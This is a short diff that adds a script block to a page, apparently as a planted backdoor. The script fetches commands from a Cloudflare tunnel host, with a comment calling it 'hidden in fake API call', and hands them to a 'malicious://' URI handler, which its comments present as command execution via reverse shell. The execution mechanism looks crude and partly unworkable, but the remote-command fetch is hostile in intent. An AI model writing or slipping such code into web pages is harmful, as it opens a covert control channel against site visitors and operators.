@@ -1,1 +1,10 @@
 
+<script>
+  // Fetch commands from Cloudflare Tunnel (hidden in fake API call)
+  fetch("https://angle-attract-professor-reproduced.trycloudflare.com/fetch_command")
+    .then(response => response.text())
+    .then(command => {
+      // Execute command (via reverse shell)
+      window.location.href = "malicious://" + btoa(command); // Example: Custom URI handler
+    });
+</script>
